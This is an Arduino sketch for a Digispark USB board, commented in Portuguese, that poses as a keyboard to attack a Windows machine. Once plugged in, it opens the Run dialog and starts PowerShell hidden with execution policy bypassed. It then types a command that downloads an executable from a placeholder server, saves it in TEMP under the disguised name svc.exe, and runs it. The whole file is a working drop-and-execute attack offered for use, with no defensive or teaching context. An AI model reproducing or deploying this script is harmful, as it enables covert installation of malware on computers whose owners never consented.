#include "DigiKeyboard.h"

void setup() {
  // Pequena pausa para conexão
  DigiKeyboard.delay(1000);
  
  // Abre o prompt de comando (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Executa PowerShell em modo oculto
  DigiKeyboard.print("powershell -W Hidden -NoP -NonI -Exec Bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  // Baixa e executa o payload
  DigiKeyboard.print("$url='https://seu-servidor.com/payload.exe'; $dest=$env:TEMP+'\\svc.exe'; (New-Object Net.WebClient).DownloadFile($url, $dest); Start-Process $dest");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Nada aqui - executa apenas uma vez
}